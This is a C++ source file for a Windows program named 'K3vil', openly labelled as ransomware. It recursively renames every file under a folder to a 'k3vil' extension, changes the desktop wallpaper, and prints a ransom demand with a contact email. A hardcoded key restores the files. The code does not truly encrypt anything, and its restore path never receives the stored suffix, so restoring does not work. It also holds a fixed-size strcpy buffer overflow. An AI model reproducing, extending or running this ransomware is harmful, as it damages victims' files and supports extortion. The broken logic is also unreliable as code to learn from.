#include<iostream>
#include<filesystem>
#include<fstream>
#include<windows.h>
#include<conio.h>


using namespace std;
using namespace filesystem;

class K3vil
{
    public:
    string suffix;

    // Ransomware that changes the extension of files
    // to the extension k3vil
    
    void ransom(string path)
    {
        for (const auto & entry : directory_iterator(path))
        {
            if(entry.is_directory())  //is folder
            {
                cout << "Folder: ";
                cout << entry.path() << endl;
                ransom(entry.path().string());
            }
            else    // its a file
            {
                cout << "Data Attacked: ";
                cout << entry.path() <<endl;

                rename(entry.path().string(),rename_suffix(entry.path().string()));
            }
        }
    }

    //suffix badlane wala func
    string rename_suffix(string str)
    {
        int i,j;
        char aux[200];

        //cpy str to aux
        strcpy(aux,str.c_str());

        //find position
        for(i=0;i<strlen(aux);i++)
        if(aux[i]=='.')
        break;

        // Add suffix at the end
        for(j=0;j<size(suffix);j++)
        aux[i+j+1]=suffix[j];
        aux[i+j+1]='\0';

        return aux;
    }

    //Adds the file extension to the file
    // in order to find the original suffix of file
    void add_file_suffix(string path,string str)
    {
        ofstream out(path.c_str(),ios::binary|ios::app);
   
        for(int i=0;i<str.size();i++)
        {
            out.put(str[i]);
        }
        out.put(char(str.size()+48));
        out.close();
    }

    // Extract the file suffix from the file
    string get_file_suffix(string path)
    {
        ifstream in(path, ios::binary);
        in.seekg(-1, ios::end);

        char c;
        in>>c;
        in.seekg(-1-(c-48)+1,ios::end);

        string str="";
        int i, n;
        n=c-48-1;
        for(i=0;i<n;i++)
        {
            in>>c;
            str+=c;
        }

        return str;
    }


    //Adds the file extension to the original file of all files inside the path
    void decryption(string path)
    {
        for (const auto & entry : directory_iterator(path))
        {
            if(entry.is_directory())   //for folder
            {
                decryption(entry.path().string());
            }
            else   //for file
            {
                this->suffix=get_file_suffix(entry.path().string());
                rename(entry.path().string(),rename_suffix(entry.path().string()));
            }
        }
    }

};


// Decryption Key process

struct Node {
    int data;
    Node* next;
};

class LinkedList {
private:
    Node* head;

public:
    LinkedList() : head(nullptr) {}

    void insert(int data) {
        Node* newNode = new Node();
        newNode->data = data;
        newNode->next = head;
        head = newNode;
    }

    bool search(int key) {
        Node* current = head;
        while (current != nullptr) {
            if (current->data == key) {
                return true;
            }
            current = current->next;
        }
        return false;
    }
};


int main()
{
    
    K3vil obj;
    obj.suffix="k3vil";
    LinkedList list;  // key to unlock
    list.insert(1345);  // key to unlock
    // Wallpaper Change process
    string wallpaperFile = "/K3vil/data/wall1.png"; // replace with the path to your image
    bool result = SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (void*)wallpaperFile.c_str(), SPIF_UPDATEINIFILE);
    char choice;
    cout << "Press 'e' to start K3vil = " << endl;
    cout << "Press 'd' to start Decryption Process = " << endl;
    cout << "//: ";
    cin >> choice;
    switch(choice){
        case 'e':
                    // To add the suffix inside the file for all files inside the path
                 obj.ransom("/K3vil/demo");       // Actual ransomware that encrypts files
                 cout << endl;
                 cout << "All your desktop files have been encrypted, kindly contact contact@kuz3y.com to get ransom key! " <<endl;
                 getch();
                 break;
        case 'd':
                 cout << "Enter your decryption key mailed to you from contact@kuz3y.com = ";
                  int key;
                  cin >> key;
                 if(list.search(key))
                   {
                    cout << "Your files are Decrypted";
                    obj.decryption("/K3vil/demo");  // To add the original suffix inside the file for all files inside the path
                    getch();
                   }
                else
                   {
                    cout << "Enter the correct password to unlock files :)";
                    getch();
                    }
                    break;
        default:
            cout << "Error! The Choice is not correct";
            break;
    }

    return 0;
}

